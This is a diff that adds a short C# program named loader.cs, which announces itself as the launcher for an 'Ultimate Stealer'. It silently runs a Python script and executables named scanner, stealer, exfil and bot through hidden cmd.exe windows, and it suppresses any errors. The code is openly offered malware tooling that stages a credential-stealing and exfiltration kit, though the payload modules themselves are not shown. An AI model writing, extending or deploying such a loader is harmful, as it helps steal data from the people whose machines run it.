@@ -1,0 +1,37 @@
+// loader.cs - 64-bit compatible
+using System;
+using System.Diagnostics;
+
+class Loader
+{
+    static void Main()
+    {
+        Console.WriteLine("[*] Starting Ultimate Stealer...");
+        
+        // Chạy Python
+        RunCmd("python main.py");
+        
+        // Chạy các file exe
+        RunCmd("scanner.exe");
+        RunCmd("stealer.exe");
+        RunCmd("exfil.exe");
+        RunCmd("bot.exe");
+        
+        Console.WriteLine("[+] All modules executed!");
+    }
+    
+    static void RunCmd(string cmd)
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = "/c " + cmd,
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+        }
+        catch { }
+    }
+}
